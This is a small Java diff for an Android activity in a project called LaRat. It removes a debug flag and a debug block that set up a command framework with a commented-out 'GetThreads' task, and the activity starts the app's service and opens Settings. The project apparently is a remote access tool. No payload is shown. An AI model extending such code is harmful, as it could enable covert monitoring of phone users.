@@ -14,8 +14,6 @@ import java.util.LinkedList;
 
 public class LaRatActivity extends Activity {
 
-    private boolean DEBUG = false;
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -27,17 +25,7 @@ public class LaRatActivity extends Activity {
             Log.i("com.c4wd.larat", "Starting the LaRat service...");
         }
 
-        if (DEBUG) {
-
-            Command.initCommands();
-
-            CommandContext ctx = new CommandContext(getApplicationContext(), new LinkedList<String>());
-
-            //AsyncTask task = Command.getTask("GetThreads");
-            //task.execute(ctx);
-
-        }
-
         startActivityForResult(new Intent(android.provider.Settings.ACTION_SETTINGS), 0);
     }
+
 }
